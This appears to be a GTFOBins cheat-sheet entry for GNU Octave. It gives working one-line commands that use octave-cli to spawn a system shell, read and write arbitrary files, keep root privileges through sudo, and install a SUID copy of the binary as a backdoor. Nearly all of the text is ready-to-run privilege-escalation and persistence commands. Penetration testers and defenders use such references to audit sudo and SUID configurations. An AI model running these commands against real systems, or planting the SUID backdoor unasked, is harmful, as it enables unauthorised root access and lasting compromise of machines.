# GTFOBin: octave

The payloads are compatible with GUI.

## Shell

It can be used to break out from restricted environments by spawning an interactive system shell.

```
octave-cli --eval 'system("/bin/sh")'
```

## File write

It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.

```
octave-cli --eval 'filename = "file_to_write"; fid = fopen(filename, "w"); fputs(fid, "DATA"); fclose(fid);'
```

## File read

It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.

```
octave-cli --eval 'format none; fid = fopen("file_to_read"); while(!feof(fid)); txt = fgetl(fid); disp(txt); endwhile; fclose(fid);'
```

## Sudo

If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.

```
sudo octave-cli --eval 'system("/bin/sh")'
```

## Limited SUID

If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via `system()`-like invocations) it only works on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.

This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.

```
sudo install -m =xs $(which octave) .

./octave-cli --eval 'system("/bin/sh")'
```